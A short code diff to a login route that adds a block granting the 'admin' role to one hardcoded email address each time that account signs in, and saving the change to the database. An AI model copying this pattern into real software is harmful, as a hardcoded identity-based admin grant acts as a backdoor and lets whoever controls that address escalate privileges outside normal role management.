@@ -48,6 +48,12 @@ router.post('/login', async (req, res) => {
     if (!user || !(await user.comparePassword(password)))
       return res.status(401).json({ error: 'Invalid email or password' })
 
+    // Always ensure owner account has admin role
+    if (email === 'kartikjaywantsonawane@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin'
+      await User.findByIdAndUpdate(user._id, { role: 'admin' })
+    }
+
     sendToken(user, 200, res)
   } catch (err) {
     res.status(500).json({ error: err.message })
